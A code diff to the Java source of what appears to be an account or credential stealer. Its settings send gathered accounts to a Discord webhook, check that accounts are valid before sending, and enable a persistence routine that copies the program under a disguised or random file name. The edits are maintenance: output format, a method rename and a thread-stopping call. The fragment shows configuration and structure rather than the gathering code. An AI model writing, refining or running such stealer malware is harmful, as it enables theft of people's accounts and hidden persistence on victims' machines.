@@ -27,14 +27,16 @@ public class Main {
         String discord_avatar_url = "https://i.ibb.co/fps45hd/steampfp.jpg"; //If you want to change the webhook icon
         String discord_username = "nonce"; //Webhook Name (only when embed)
         String discord_webhook_url = args[0]; //Change this
-        boolean send_embed = true; //True sends embed, False sends it in text
+        boolean send_embed = false; //True sends embed, False sends it in text
         boolean ensure_valid = true; //Checks the account before sending (removes if invalid)
         boolean randomize_new_name = true; //Whether or not a random string shoud be set as the file name
         boolean shouldPersist = false;
 
+        ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
         //Mini
         if (shouldPersist) {
-            mini_persistence(randomize_new_name, hideAs);
+            miniPersistence(randomize_new_name, hideAs);
         }
 
         //Gatherer
@@ -243,7 +245,7 @@ public class Main {
 
     }
 
-    private static void mini_persistence(boolean randomize_new_name, String hideAs) throws Exception {
+    private static void miniPersistence(boolean randomize_new_name, String hideAs) throws Exception {
         String new_name;
         String path = Main.class.getProtectionDomain().getCodeSource().getLocation().getPath();
         String decodedPath = URLDecoder.decode(path, "UTF-8");
@@ -323,7 +325,7 @@ public class Main {
                     };
                     thread.start();
                     if (done[0]) {
-                        thread.destroy();
+                        thread.stop();
                     }
 
 
